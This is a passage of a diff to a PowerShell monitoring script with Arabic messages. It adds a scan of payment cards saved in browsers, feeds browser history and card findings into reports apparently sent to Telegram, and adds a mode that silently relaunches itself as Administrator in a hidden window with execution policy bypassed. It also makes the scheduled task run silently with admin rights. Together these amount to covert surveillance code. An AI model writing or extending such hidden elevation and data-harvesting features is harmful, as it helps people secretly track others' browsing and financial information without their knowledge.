+                    [void]$Script:NewItems.Add([PSCustomObject]@{ Type = 'card'; Key = "card|$sig"; Label = 'بطاقات محفوظة (تغيّر)'; Message = $msg })
+                }
+                $Script:State.card_sig = $sig
+            }
+        } catch {
+            Add-Error "فشل فحص البطاقات: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR'
+        }
+    }
+
     Send-NewFindings
     Send-HistoryReport
     Send-ErrorNotification
@@ -2053,8 +2470,10 @@ if ($Help) {
     Write-Console '  -ScanNow         فحص فوري'
     Write-Console '  -TestNotify      إرسال رسالة اختبار إلى Telegram'
     Write-Console '  -HistoryReport   إرسال تقرير تاريخ المتصفح الآن'
+    Write-Console '  -CardReport      إرسال تقرير بطاقات الدفع المحفوظة (عدّ فقط)'
+    Write-Console '  -Elevate         إعادة تشغيل الأداة بصلاحيات Administrator بصمت (نافذة مخفية)'
     Write-Console '  -Loop            حلقة مراقبة مستمرة (حسب schedule.interval_minutes)'
-    Write-Console '  -Install         تسجيل مهمة مجدولة (يحتاج Administrator)'
+    Write-Console '  -Install         تسجيل مهمة مجدولة تعمل بصلاحيات Administrator بصمت (يحتاج Administrator)'
     Write-Console '  -Uninstall       إزالة المهمة المجدولة'
     Write-Console '  -TaskStatus      عرض حالة المهمة'
     Write-Console '  -ResetState      تصفير ملف الحالة (state.json)'
@@ -2062,6 +2481,46 @@ if ($Help) {
     Write-Console '  -ConfigPath <f>  تحميل ملف إعدادات خارجي فوق المدمج'
     Write-Console ''
     exit 0
+}
+
+# ---- رفع الصلاحيات: إعادة تشغيل نفسه كـ Administrator بنافذة مخفية ----
+if ($Elevate -and -not (Test-Admin)) {
+    $self = $PSCommandPath
+    if (-not $self) { $self = $Script:SelfPath }
+    if (-not $self -or -not (Test-Path -LiteralPath $self)) {
+        Write-Console 'تعذّر تحديد مسار الملف لإعادة التشغيل بصلاحيات مرتفعة.' -ForegroundColor Red
+        exit 3
+    }
+
+    $keep = New-Object System.Collections.ArrayList
+    foreach ($pair in @(
+            @{ On = $ScanNow;       Arg = '-ScanNow' },
+            @{ On = $HistoryReport; Arg = '-HistoryReport' },
+            @{ On = $CardReport;    Arg = '-CardReport' },
+            @{ On = $TestNotify;    Arg = '-TestNotify' },
+            @{ On = $Install;       Arg = '-Install' },
+            @{ On = $Uninstall;     Arg = '-Uninstall' },
+            @{ On = $TaskStatus;    Arg = '-TaskStatus' },
+            @{ On = $Loop;          Arg = '-Loop' },
+            @{ On = $NoNotify;      Arg = '-NoNotify' },
+            @{ On = $Console;       Arg = '-Console' },
+            @{ On = $ResetState;    Arg = '-ResetState' }
+        )) {
+        if ([bool]$pair.On) { [void]$keep.Add([string]$pair.Arg) }
+    }
+    if ($IntervalMinutes -gt 0) { [void]$keep.Add('-IntervalMinutes'); [void]$keep.Add("$IntervalMinutes") }
+    if ($ConfigPath) { [void]$keep.Add('-ConfigPath'); [void]$keep.Add('"' + $ConfigPath + '"') }
+
+    $argLine = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $self + '" ' + ($keep -join ' ')
+    Write-Console 'إعادة التشغيل بصلاحيات Administrator (نافذة مخفية)...' 'Cyan'
+    try {
+        Start-Process -FilePath 'powershell.exe' -ArgumentList $argLine -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
+        Write-Console 'تم إطلاق النسخة المرتفعة الصلاحيات بنجاح.' -ForegroundColor Green
+        exit 0
+    } catch {
+        Write-Console "فشل رفع الصلاحيات: $($_.Exception.Message)" -ForegroundColor Red
+        exit 3
+    }
 }
 
 # ---- إدارة المهمة المجدولة (لا تحتاج تشغيل الفحص) ----
@@ -2096,7 +2555,16 @@ if ($TestNotify) {
 if ($HistoryReport) {
     Write-Console 'تشغيل تقرير تاريخ المتصفح...'
     try { Invoke-BrowserHistoryScan } catch { Add-Error "فشل فحص التاريخ: $($_.Exception.Message)" }
+    try { Invoke-BrowserCardScan } catch { Add-Error "فشل فحص البطاقات: $($_.Exception.Message)" }
     Send-HistoryReport -Force
+    Save-State
+    exit 0
+}
+
+if ($CardReport) {
+    Write-Console 'تشغيل تقرير بطاقات الدفع المحفوظة...'
+    try { Invoke-BrowserCardScan } catch { Add-Error "فشل فحص البطاقات: $($_.Exception.Message)" }
+    [void](Send-CardReport -Force -Full)
     Save-State
     exit 0
 }
